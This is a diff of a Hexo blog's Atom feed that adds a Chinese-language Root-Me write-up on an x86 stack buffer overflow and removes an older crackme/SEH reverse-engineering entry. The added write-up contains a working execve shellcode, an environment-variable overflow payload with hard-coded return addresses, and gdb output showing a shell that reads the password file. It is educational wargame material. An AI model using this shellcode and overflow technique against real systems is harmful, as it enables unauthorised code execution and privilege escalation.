@@ -6,7 +6,7 @@
   <link href="http://finsenty54.github.io/atom.xml" rel="self"/>
   
   <link href="http://finsenty54.github.io/"/>
-  <updated>2020-12-28T13:11:00.839Z</updated>
+  <updated>2020-12-29T13:27:04.972Z</updated>
   <id>http://finsenty54.github.io/</id>
   
   <author>
@@ -15,6 +15,48 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ELF x86 - stack buffer overflow basic 4</title>
+    <link href="http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/"/>
+    <id>http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</id>
+    <published>2020-12-29T13:26:05.000Z</published>
+    <updated>2020-12-29T13:27:04.972Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="ELF-x86-stack-buffer-overflow-basic-4"><a href="#ELF-x86-stack-buffer-overflow-basic-4" class="headerlink" title="ELF x86 - stack buffer overflow basic 4"></a>ELF x86 - stack buffer overflow basic 4</h1><p>参考: </p><ol><li><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li><li><a href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li><li><a href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li></ol><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> 中有<code>strcpy()</code>函数，存在溢出点。</p><pre><code>            +----------------------------+            |      HOME env variable     |     %ebp - 540            +----------------------------+            |    USERNAME env variable   |     %ebp - 412            +----------------------------+            |      SHELL env variable    |     %ebp - 284            +----------------------------+            |      PATH env variable     |     %ebp - 156            +----------------------------+            |           saved ebp        |            +----------------------------+            |        return address      |     %ebp + 4            +----------------------------+            |   rep movsl dest. address  |     %ebp + 8            +----------------------------+  </code></pre><a id="more"></a><p>var char *dest @ ebp-0x21c</p><p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] 第二次的赋值，USERNAME</p><pre><code>gdb-peda$ x/101xw 0xbffff3cc 存输入值0xbffff3cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff40c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff41c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff42c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff43c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff44c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff45c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff46c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff47c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff48c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff49c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ac:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4bc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff50c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff51c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff52c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff53c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff54c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff55c:     0x0804a000</code></pre><p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>存shell 字符串</p><p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>放path</p><p>如果打印420（412+4 =416 在这里输入4个字节，总长变为420） a，溢出</p><pre><code>gdb-peda$ x/16xb 0xbffff55c0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre><p>path后面跟着一个null \00<br>会改变指针值，结构体赋值到$ebp+8指向的地址处</p><p>打印416 a</p><pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre><p>没有改变ebp+8<br>这个地址是main中env结构体地址</p><hr><p>我们将shellcode放在USERNAME上，我试了几个shellcode，只有这个有用，</p><pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre><p>总长33字节</p><p>然后溢出PATH，要保证$ebp+8的值不变（小端序），<br>path长119，再填充一个<code>：</code>，保持为4的倍数，</p><pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/:`python -c &#39;print(&quot;\x6c\xf5\xff\xbf&quot;*11+&quot;\x50\xf7\xff\xbf&quot;)&#39;`</code></pre><p><code>0xbfff56c</code>是USERNAME地址，<code>0xbffff750</code>是$ebp+8的值，现在PATH总长168。</p><pre><code>app-systeme-ch8@challenge02:~$ ./ch8[+] Getting env...bash-4.4$ cat .passwd</code></pre><h2 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h2><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p><code>export USERNAME=</code></p><p>gdb中<br><code>set env USERNAME=</code></p><p>查看<br><code>x/x env.path</code></p><h3 id="查看环境变量长度"><a href="#查看环境变量长度" class="headerlink" title="查看环境变量长度"></a>查看环境变量长度</h3><p><code>echo $&#123;#PATH&#125;</code></p><hr><p><code>gdb-peda$ print $ebp-0xbffff55c</code></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;ELF-x86-stack-buffer-overflow-basic-4&quot;&gt;&lt;a href=&quot;#ELF-x86-stack-buffer-overflow-basic-4&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - stack buffer overflow basic 4&quot;&gt;&lt;/a&gt;ELF x86 - stack buffer overflow basic 4&lt;/h1&gt;&lt;p&gt;参考: &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&quot;&gt;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&quot;&gt;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;p&gt;&lt;code&gt;struct EnvInfo GetEnv(void)&amp;#123;&amp;#125;&lt;/code&gt; 中有&lt;code&gt;strcpy()&lt;/code&gt;函数，存在溢出点。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;            +----------------------------+
+            |      HOME env variable     |     %ebp - 540
+            +----------------------------+
+            |    USERNAME env variable   |     %ebp - 412
+            +----------------------------+
+            |      SHELL env variable    |     %ebp - 284
+            +----------------------------+
+            |      PATH env variable     |     %ebp - 156
+            +----------------------------+
+            |           saved ebp        |
+            +----------------------------+
+            |        return address      |     %ebp + 4
+            +----------------------------+
+            |   rep movsl dest. address  |     %ebp + 8
+            +----------------------------+  &lt;/code&gt;&lt;/pre&gt;</summary>
+    
+    
+    
+    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
+    
+    
+    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
+    
+  </entry>
   
   <entry>
     <title>ELF x86 - BSS buffer overflow &amp; 构造shellcode</title>
@@ -425,25 +467,6 @@ call    _strlen&lt;/code&gt;&lt;/pre&gt;</summary>
     
     
     <summary type="html">&lt;h2 id=&quot;ELF-—-Random-Crackme&quot;&gt;&lt;a href=&quot;#ELF-—-Random-Crackme&quot; class=&quot;headerlink&quot; title=&quot;ELF — Random Crackme&quot;&gt;&lt;/a&gt;ELF — Random Crackme&lt;/h2&gt;&lt;p&gt;将&lt;code&gt;magic&lt;/code&gt;之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件&lt;br&gt;&lt;code&gt;ELF files start with 7f 45 4c 46&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://imgchr.com/i/0v8xN8&quot;&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/19/0v8xN8.jpg&quot; alt=&quot;0v8xN8.jpg&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>root_me_PE_x86_SEHVEH_WP</title>
-    <link href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/"/>
-    <id>http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/</id>
-    <published>2020-10-13T11:02:38.000Z</published>
-    <updated>2020-10-31T08:53:12.112Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>使用 <code>NET relector</code>工具<br>或者<code>dnSPY</code><br><a href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a><br>就可以破解</p><a id="more"></a><hr><h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python 编程</p><p><code>别人写的代码</code><br><a href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p><p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>将数字或字符转为整形<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p><pre><code>num=line[addr+1,-1]byte.append(int (num,16)) //将num变为16进制</code></pre><p>使用<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> 获得反汇编代码<br>之后进行搜索</p><hr><h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。</p><p><em>OllyDBG 查看seh链 选择 <code>view-seh chain</code></em></p><hr><ol><li><p>在输入后进入主要部分。</p><img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0" />这段不是很懂，根据多次调试后判断，如果输入12个字节，则`0xB814A8`处就可以跳转，使`EBP`为0.<img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0" />为0，即表示密码正确，会输入成功语句。</li><li><p>接下来是第一部分密码</p><img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0" />`LODS `即将密码头四个字节放入`EAX`中，将`0x5A643059 xor 0x 3628552E `得到第一部分密码，还需反序排列为`weLl`</li><li><p>FS：[0] 为TEB结构体中指向第一个SEH结构体地址</p><img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0" /><img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0" />即`0xEFFC14`.接着，执行`INT 1`指令后，会进入`0xDB1D60`处的第一个SEH函数。<img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0" />SEH函数的第三个参数，即`[ESP+C]`为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，`+0xB0`为EAX寄存器的值，`0xB81D64`处将`0x48335621`加到`EAX+0xB0`中，保存着输入的第二部分四字节密码。`+0xB8`为EIP寄存器的值，通过下面的判断将EIP值加2，结果为`0xB814E4`，即`INT 1`指令的下一条指令地址。`XOR EAX,EAX`将EAX置0，表示从发生异常的代码处继续执行。<img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0" />最后计算如下：`FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_`反序排列为`_d@n`</li><li><p><code>0xB814FF</code>处调用<code>AddVectoredExceptionHandler</code>函数，新增一个SEH函数。</p><img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0" />以下摘自https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>`First`The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.如果不为0，则成为第一个调用的SEH函数，从图中可以看到，`First=1`.`Handler`A pointer to the handler to be called. For more information, see VectoredHandler.从图中看出，函数地址为`0xB81940`，`Return value`If the function succeeds, the return value is a handle to the exception handler.If the function fails, the return value is NULL.<img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0" />该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。`有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。`最后计算如下：`3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E`反序排列为`E!!!`</li><li><p>最后三部分密码组合在一起：<code>weLl_d@nE!!!</code></p><img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0" />密码正确</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h3 id=&quot;PE-DotNet-0-protection&quot;&gt;&lt;a href=&quot;#PE-DotNet-0-protection&quot; class=&quot;headerlink&quot; title=&quot;PE DotNet - 0 protection&quot;&gt;&lt;/a&gt;PE DotNet - 0 protection&lt;/h3&gt;&lt;p&gt;使用 &lt;code&gt;NET relector&lt;/code&gt;工具&lt;br&gt;或者&lt;code&gt;dnSPY&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/0xd4d/dnSpy/releases&quot;&gt;https://github.com/0xd4d/dnSpy/releases&lt;/a&gt;&lt;br&gt;就可以破解&lt;/p&gt;</summary>
     
     
     
